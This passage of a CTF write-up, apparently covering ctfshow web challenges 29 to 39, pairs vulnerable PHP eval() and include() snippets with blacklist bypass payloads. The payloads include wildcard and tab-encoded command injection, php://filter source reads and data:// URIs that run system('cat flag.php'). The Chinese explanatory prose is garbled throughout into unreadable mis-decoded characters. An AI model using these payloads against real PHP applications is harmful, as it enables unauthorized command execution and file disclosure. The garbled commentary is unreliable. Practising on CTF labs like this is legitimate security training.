key\">c</span>=<span class=\"token value\">echo</span></span></span> `cat fla<span class=\"token query\"><span class=\"token query-delimiter\">?</span><span class=\"token pair\"><span class=\"token key\">.ph?</span></span></span>`;\n<span class=\"token path\">c=passthru('cat</span> fla<span class=\"token query\"><span class=\"token query-delimiter\">?</span><span class=\"token pair\"><span class=\"token key\">.ph?')</span></span><span class=\"token pair-delimiter\">;</span></span>\n<span class=\"token query\"><span class=\"token query-delimiter\">?</span><span class=\"token pair\"><span class=\"token key\">c</span>=<span class=\"token value\">echo</span></span></span> shell_exec('cat f*');<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221026153914690.png\" alt=\"image-20221026153914690\" /></p>\n<p>å°±è¿‡æ»¤äº†ä¸€ä¸ª flagï¼Œé—®å·åŒ¹é…ä¸€ä¸‹ç»•è¿‡</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">system()\npassthru()\nexec()&#x2F;&#x2F;æ²¡æœ‰å›æ˜¾ï¼Œè¿”å›æœ€åä¸€è¡Œ\nshell_exec()&#x2F;&#x2F;æ²¡æœ‰è¿”å›ç»“æœ<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>ä¸Šé¢çš„å‡½æ•°éƒ½å¯ä»¥æ‰§è¡Œå‘½ä»¤</p>\n<h2 id=\"web30\"><a class=\"anchor\" href=\"#web30\">#</a> web30</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"> <span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/flag|system|php/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    \n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span> </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>é»‘åå•åŠ å…¥äº† php å’Œ systemï¼ŒåŒä¸Šå¯ç»•è¿‡</p>\n<h2 id=\"web31\"><a class=\"anchor\" href=\"#web31\">#</a> web31</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/flag|system|php|cat|sort|shell|\\.| |\\'/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    \n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>é»‘åå•æ–°åŠ å…¥ catï¼Œsortï¼Œshellï¼Œ.ï¼Œ'</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">?c&#x3D;echo%09&#96;tac%09fl*&#96;;\n?c&#x3D;passthru(&quot;tac%09f*&quot;);<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre></p>\n<p>è¿™é‡Œä¹Ÿç®€å•çš„è§£é‡Šä¸€ä¸‹ ctfshow ç»™çš„ payload</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token function\">next</span><span class=\"token punctuation\">(</span><span class=\"token function\">array_reverse</span><span class=\"token punctuation\">(</span><span class=\"token function\">scandir</span><span class=\"token punctuation\">(</span><span class=\"token function\">pos</span><span class=\"token punctuation\">(</span><span class=\"token function\">localeconv</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token function\">localeconv</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> å‡½æ•°è¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚æ•°ç»„çš„ç¬¬ä¸€é¡¹æ˜¯â€™<span class=\"token operator\">.</span>â€˜\n<span class=\"token function\">localeconv</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> å‡½æ•°ä¼šè¿”å›ä»¥ä¸‹æ•°ç»„å…ƒç´ ï¼š\n<span class=\"token punctuation\">[</span>decimal_point<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> å°æ•°ç‚¹å­—ç¬¦\n<span class=\"token punctuation\">[</span>thousands_sep<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> åƒä½åˆ†éš”ç¬¦\n<span class=\"token punctuation\">[</span>int_curr_symbol<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> è´§å¸ç¬¦å· ï¼ˆä¾‹å¦‚ï¼š<span class=\"token constant\">USD</span>ï¼‰\n<span class=\"token punctuation\">[</span>currency_symbol<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> è´§å¸ç¬¦å· ï¼ˆä¾‹å¦‚ï¼š$ï¼‰\n<span class=\"token punctuation\">[</span>mon_decimal_point<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> è´§å¸å°æ•°ç‚¹å­—ç¬¦\n<span class=\"token punctuation\">[</span>mon_thousands_sep<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> è´§å¸åƒä½åˆ†éš”ç¬¦\n<span class=\"token punctuation\">[</span>positive_sign<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> æ­£å€¼å­—ç¬¦\n<span class=\"token punctuation\">[</span>negative_sign<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> è´Ÿå€¼å­—ç¬¦\n<span class=\"token punctuation\">[</span>int_frac_digits<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> å›½é™…é€šç”¨å°æ•°ä½\n<span class=\"token punctuation\">[</span>frac_digits<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> æœ¬åœ°é€šç”¨å°æ•°ä½\n<span class=\"token punctuation\">[</span>p_cs_precedes<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> å¦‚æœè´§å¸ç¬¦å·åœ¨ä¸€ä¸ªæ­£æ•°å€¼ä¹‹å‰æ˜¾ç¤ºï¼Œåˆ™ä¸º <span class=\"token constant boolean\">True</span>ï¼ˆ<span class=\"token number\">1</span>ï¼‰ï¼Œå¦‚æœåœ¨æ­£æ•°å€¼ä¹‹åæ˜¾ç¤ºï¼Œåˆ™ä¸º <span class=\"token constant boolean\">False</span>ï¼ˆ<span class=\"token number\">0</span>ï¼‰\n<span class=\"token punctuation\">[</span>p_sep_by_space<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> å¦‚æœåœ¨è´§å¸ç¬¦å·å’Œæ­£æ•°å€¼ä¹‹é—´åŒ…å«ç©ºæ ¼ï¼Œåˆ™ä¸º <span class=\"token constant boolean\">True</span>ï¼ˆ<span class=\"token number\">1</span>ï¼‰ï¼Œå¦åˆ™ä¸º <span class=\"token constant boolean\">False</span>ï¼ˆ<span class=\"token number\">0</span>ï¼‰\n<span class=\"token punctuation\">[</span>n_cs_precedes<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> å¦‚æœè´§å¸ç¬¦å·åœ¨ä¸€ä¸ªè´Ÿæ•°å€¼ä¹‹å‰æ˜¾ç¤ºï¼Œåˆ™ä¸º <span class=\"token constant boolean\">True</span>ï¼ˆ<span class=\"token number\">1</span>ï¼‰ï¼Œå¦‚æœåœ¨è´Ÿæ•°å€¼ä¹‹åæ˜¾ç¤ºï¼Œåˆ™ä¸º <span class=\"token constant boolean\">False</span>ï¼ˆ<span class=\"token number\">0</span>ï¼‰\n<span class=\"token punctuation\">[</span>n_sep_by_space<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> å¦‚æœåœ¨è´§å¸ç¬¦å·å’Œè´Ÿæ•°å€¼ä¹‹é—´åŒ…å«ç©ºæ ¼ï¼Œåˆ™ä¸º <span class=\"token constant boolean\">True</span>ï¼ˆ<span class=\"token number\">1</span>ï¼‰ï¼Œå¦åˆ™ä¸º <span class=\"token constant boolean\">False</span>ï¼ˆ<span class=\"token number\">0</span>ï¼‰\n<span class=\"token punctuation\">[</span>p_sign_posn<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> æ ¼å¼åŒ–é€‰é¡¹ï¼š\n<span class=\"token number\">0</span> <span class=\"token operator\">-</span> æŠŠæ•°é‡å’Œè´§å¸ç¬¦å·å†™åœ¨åœ†æ‹¬å·å†…\n<span class=\"token number\">1</span> <span class=\"token operator\">-</span> åœ¨æ•°é‡å’Œè´§å¸ç¬¦å·ä¹‹å‰åŠ ä¸Š <span class=\"token operator\">+</span> å·\n<span class=\"token number\">2</span> <span class=\"token operator\">-</span> åœ¨æ•°é‡å’Œè´§å¸ç¬¦å·ä¹‹ååŠ ä¸Š <span class=\"token operator\">+</span> å·\n<span class=\"token number\">3</span> <span class=\"token operator\">-</span> ç›´æ¥åœ¨è´§å¸ç¬¦å·ä¹‹å‰åŠ ä¸Š <span class=\"token operator\">+</span> å·\n<span class=\"token number\">4</span> <span class=\"token operator\">-</span> ç›´æ¥åœ¨è´§å¸ç¬¦å·ä¹‹ååŠ ä¸Š <span class=\"token operator\">+</span> å·\n<span class=\"token punctuation\">[</span>n_sign_posn<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> æ ¼å¼åŒ–é€‰é¡¹ï¼š\n<span class=\"token number\">0</span> <span class=\"token operator\">-</span> æŠŠæ•°é‡å’Œè´§å¸ç¬¦å·å†™åœ¨åœ†æ‹¬å·å†…\n<span class=\"token number\">1</span> <span class=\"token operator\">-</span> åœ¨æ•°é‡å’Œè´§å¸ç¬¦å·ä¹‹å‰åŠ ä¸Š <span class=\"token operator\">-</span> å·\n<span class=\"token number\">2</span> <span class=\"token operator\">-</span> åœ¨æ•°é‡å’Œè´§å¸ç¬¦å·ä¹‹ååŠ ä¸Š <span class=\"token operator\">-</span> å·\n<span class=\"token number\">3</span> <span class=\"token operator\">-</span> ç›´æ¥åœ¨è´§å¸ç¬¦å·ä¹‹å‰åŠ ä¸Š <span class=\"token operator\">-</span> å·\n<span class=\"token number\">4</span> <span class=\"token operator\">-</span> ç›´æ¥åœ¨è´§å¸ç¬¦å·ä¹‹ååŠ ä¸Š <span class=\"token operator\">-</span> å·\n<span class=\"token punctuation\">[</span>grouping<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> æ˜¾ç¤ºæ•°å­—ç»„åˆå½¢å¼çš„æ•°ç»„ï¼ˆä¾‹å¦‚ï¼š<span class=\"token number\">3</span> æŒ‡ç¤º <span class=\"token number\">1</span> <span class=\"token number\">000</span> <span class=\"token number\">000</span>ï¼‰\n<span class=\"token punctuation\">[</span>mon_grouping<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> æ˜¾ç¤ºè´§å¸æ•°å­—ç»„åˆå½¢å¼çš„æ•°ç»„ï¼ˆä¾‹å¦‚ï¼š<span class=\"token number\">2</span> æŒ‡ç¤º <span class=\"token number\">1</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span>ï¼‰<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221027113321559.png\" alt=\"image-20221027113321559\" /></p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token function\">pos</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token function\">current</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>è¿”å›æ•°ç»„ç¬¬ä¸€ä¸ªå€¼<span class=\"token comment\">// é…åˆä¸Šé¢çš„ localeconv () å¯ä»¥è¿”å›ä¸€ä¸ªç‚¹</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221027114014169.png\" alt=\"image-20221027114014169\" /></p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token function\">scandir</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> å‡½æ•°è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221027113840633.png\" alt=\"image-20221027113840633\" /></p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>æ•°ç»„æŒ‡é’ˆæŒ‡å‘æœ€åä¸€ä½\n<span class=\"token function\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> æ•°ç»„æŒ‡é’ˆæŒ‡å‘ä¸‹ä¸€ä½\n<span class=\"token function\">array_reverse</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> å°†æ•°ç»„é¢ å€’\n<span class=\"token function\">array_rand</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> éšæœºè¿”å›æ•°ç»„çš„é”®å\n<span class=\"token function\">array_flip</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>ï¼šäº¤æ¢æ•°ç»„çš„é”®å’Œå€¼\nè¯»å–æ–‡ä»¶ï¼š\n<span class=\"token function\">file_get_content</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> \n<span class=\"token function\">readfile</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<h2 id=\"web32\"><a class=\"anchor\" href=\"#web32\">#</a> web32</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    \n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>è¿‡æ»¤é™åˆ¶åŠ å…¥äº†åå¼•å·ã€echoã€;ã€(</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p>è¿‡æ»¤äº†æ‹¬å·ï¼Œinclude å‡½æ•°ä¸éœ€è¦æ‹¬å·</p>\n<h2 id=\"web37\"><a class=\"anchor\" href=\"#web37\">#</a> web37</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token comment\">//flag in flag.php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/flag/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span>\n    \n    <span class=\"token punctuation\">&#125;</span>\n        \n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>è¿™å·²ç»çŸ¥é“ flag åœ¨ flag.php ä¸­äº†ï¼Œåˆ©ç”¨ä¼ªåè®®è¯»å– flag</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">1ã€php:&#x2F;&#x2F;input å¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®,é…åˆæ–‡ä»¶åŒ…å«æ¼æ´å¯ä»¥å°†postè¯·æ±‚ä½“ä¸­çš„å†…å®¹å½“åšæ–‡ä»¶å†…å®¹æ‰§è¡Œ,ä»è€Œå®ç°ä»»æ„ä»£ç æ‰§è¡Œ\nå¯ä»¥è·å–POSTçš„æ•°æ®æµ\n2ã€php:&#x2F;&#x2F;filter\nphp:&#x2F;&#x2F;filter åè®®å¯ä»¥å¯¹æ‰“å¼€çš„æ•°æ®æµè¿›è¡Œç­›é€‰å’Œè¿‡æ»¤,å¸¸ç”¨äºè¯»å–æ–‡ä»¶æºç \nå¯ä»¥è·å–æŒ‡å®šæ–‡ä»¶çš„æºç ï¼Œä½†æ˜¯å½“ä»–ä¸åŒ…å«å‡½æ•°ç»“åˆæ˜¯ï¼Œphp:&#x2F;&#x2F;filteræµä¼šè¢«å½“åšphpæ–‡ä»¶æ‰§è¡Œ\nã€‚æ‰€ä»¥æˆ‘ä»¬ä¸€èˆ¬å¯¹å…¶è¿›è¡Œç¼–ç ï¼Œè®©å…¶ä¸æ‰§è¡Œã€‚ä»è€Œå¯¼è‡´ ä»»æ„æ–‡ä»¶è¯»å–\n4ã€data:&#x2F;&#x2F;\ndata:&#x2F;&#x2F;åè®®é€šè¿‡æ‰§è¡Œèµ„æºç±»å‹,ä½¿åé¢çš„å†…å®¹å½“åšæ–‡ä»¶å†…å®¹æ¥æ‰§è¡Œ,ä»è€Œé€ æˆä»»æ„ä»£ç æ‰§è¡Œ\nåŒæ ·ç±»ä¼¼äºphp:&#x2F;&#x2F;input<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs&#x2F;Pg&#x3D;&#x3D;\n\ndata:&#x2F;&#x2F;text&#x2F;plain,&lt;?php system(&#39;cat fl?g.php&#39;);<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre></p>\n<h2 id=\"web38\"><a class=\"anchor\" href=\"#web38\">#</a> web38</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"> <span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token comment\">//flag in flag.php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/flag|php|file/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span>\n    \n    <span class=\"token punctuation\">&#125;</span>\n        \n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span> </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>å¢åŠ äº† php å’Œ fileï¼Œè¿˜æ˜¯ä½¿ç”¨ data ä¼ªåè®®</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs&#x2F;Pg&#x3D;&#x3D;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<h2 id=\"web39\"><a class=\"anchor\" href=\"#web39\">#</a> web39</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token comment\">//flag in flag.php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/flag/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token 